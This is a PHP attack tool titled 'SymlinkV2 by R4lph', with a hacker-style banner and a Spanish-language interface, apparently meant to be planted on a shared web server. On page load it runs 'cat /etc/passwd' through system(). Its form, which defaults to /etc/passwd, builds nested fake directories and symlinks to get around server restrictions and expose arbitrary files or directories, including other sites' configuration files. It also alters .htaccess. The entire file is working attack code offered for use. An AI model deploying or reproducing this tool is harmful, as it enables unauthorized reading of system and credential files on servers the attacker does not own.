<?PHP

###############################

#All Right Reserved By R4LPH

#Coded By R4lph

###############################

session_start();

$Res = '';

if(is_writable(".")){
  
  if(isset($_POST['file'])){
    
    $file = $_POST['file'];
    
    $fakedir="fake";
    
    $fakedep=16;
    
    if(!(isset($_SESSION['num']))){
      
      $_SESSION['num'] = 0;
      
    }
    
    else{
      
      $_SESSION['num'] = $_SESSION['num'] + 1;
      
    }
    
    $level=0;
    
    @unlink("R4lph_".$_SESSION['num']);
    
    @mkdir("r4lph_".$_SESSION['num']);
    
    chdir("r4lph_".$_SESSION['num']);
    
    for($as=0;$as<$fakedep;$as++){
      
      if(!file_exists($fakedir))
      
      mkdir($fakedir);
      
      chdir($fakedir);
      
    }
    
    while(1<$as--) chdir("..");
    
    $hardstyle = explode("/", $file);
    
    for($a=0;$a<count($hardstyle);$a++){
      
      if(!empty($hardstyle[$a])){
        
        if(!file_exists($hardstyle[$a]))
        
        mkdir($hardstyle[$a]);
        
        chdir($hardstyle[$a]);
        
        $as++;
        
      }
      
    }
    
    $as++;
    
    while($as--)
    
    chdir("..");
    
    @rmdir("r4lph_fake");
    
    @unlink("r4lph_fake");
    
    @symlink(str_repeat($fakedir."/",$fakedep),"r4lph_fake");
    
    if($_POST['type'] == 'file'){
      
      while(1)
      
      if(true==(@symlink("r4lph_fake/".str_repeat("../",$fakedep-1).$file,"config.txt"))) break;
      
      else $num++;
      
      @unlink("r4lph_fake");
      
      mkdir("r4lph_fake");
      
      $Res = '<FONT COLOR="RED"><B> Ah sido crado el <B><a href="./r4lph_'.$_SESSION['num'].'/">symlink'.$num.'</a> :)</FONT>';
      
    }
    
    else{
      
      $fp = fopen(".htaccess",'a+');
      
      $File = 'DirectoryIndex sun.htm';
      
      fwrite($fp,$File);
      
      while(1)
      
      if(true==(@symlink("r4lph_fake/".str_repeat("../",$fakedep-1).$file,"colh"))) break;
      
      else $num++;
      
      @unlink("r4lph_fake");
      
      mkdir("r4lph_fake");
      
      $Res = '<FONT COLOR="RED"><a href="./r4lph_'.$_SESSION['num'].'/colh">Directorio Symlinkeado!'.$num.'</a></FONT>';
      
    }
    
  }
  
}

else{
  
  $Res = '<FONT COLOR="RED">No puedes escribir en este directorio</Font>';
  
}

If (@ini_get("safe_mode") Or strtoupper(@ini_get("safe_mode")) == "on"){$Safe='<span style="color:red"><b>On</b></span>';}Else{$Safe='<span style="color:#8A0808"><b>Off</b></span>';}

?>

<html><body bgcolor=black>
  <center>
    <pre><font color="white" style="text-shadow: 5px 5px 10px  #00FF50">
      
      ______                           __  __            __                        __
      /      \                         /  |/  |          /  |                      /  |
      /$$$$$$  | __    __  _____  ____  $$ |$$/  _______  $$ |   __         ______  $$ |____    ______
      $$ \__$$/ /  |  /  |/     \/    \ $$ |/  |/       \ $$ |  /  |       /      \ $$      \  /      \
      $$      \ $$ |  $$ |$$$$$$ $$$$  |$$ |$$ |$$$$$$$  |$$ |_/$$/       /$$$$$$  |$$$$$$$  |/$$$$$$  |
      $$$$$$  |$$ |  $$ |$$ | $$ | $$ |$$ |$$ |$$ |  $$ |$$   $$<        $$ |  $$ |$$ |  $$ |$$ |  $$ |
      /  \__$$ |$$ \__$$ |$$ | $$ | $$ |$$ |$$ |$$ |  $$ |$$$$$$  \       $$ |__$$ |$$ |  $$ |$$ |__$$ |
      $$    $$/ $$    $$ |$$ | $$ | $$ |$$ |$$ |$$ |  $$ |$$ | $$  |      $$    $$/ $$ |  $$ |$$    $$/
      $$$$$$/   $$$$$$$ |$$/  $$/  $$/ $$/ $$/ $$/   $$/ $$/   $$/       $$$$$$$/  $$/   $$/ $$$$$$$/
      /  \__$$ |                                                $$ |                $$ |
      $$    $$/                                                 $$ |                $$ |
      $$$$$$/                                                  $$/                 $$/
      V2
      Make by R4lph, Contact: @R4lphManga
    </pre></font>
    <textarea rows="10" name="texto" cols="60"
    style="font-family: Courier New; background-color: #FFFFFF; color: #003D60; border: thin outset"><?php
    $r4lph = @system('cat /etc/passwd');
    ?></textarea>
    
    <Title>SymlinkV2 by R4lph</Title>
    
  </Head>
  
  <Body bgcolor="black">
    
    <Center>
    </center>
    <br><br><br>
    <font size=5>
      <?PHP echo '<div style="color:lime"><font face=arial><b>Safe-Mode : '.$Safe;?>
        
        <Form action="<?PHP echo $_SERVER["PHP_SELF"]; ?>" method="post">
          
          <font color="lime" size="4" face="arial"><b>Path:<b></font><Input type="text" name="file" style="color:red;width:400px;" value="/etc/passwd"><br><font color="lime" size=3 face="arial"><br><b>Archivo</b></font><input checked type="radio" name="type" value="file"><font color="lime" size=3 face="arial"> <b>Directorio</font><input type="radio" name="type" value="Dir"><br><br><br><Input type="submit" value="Symlinkear!" style="width:100px;background-color:black;color:lime">
            
          </font>
          
        </Form>
        
        <?PHP print $Res;?>
        
        <table align="center" style="color:lime">!</table>
        
      </Center>
      
    </Body>
    
  </Html>
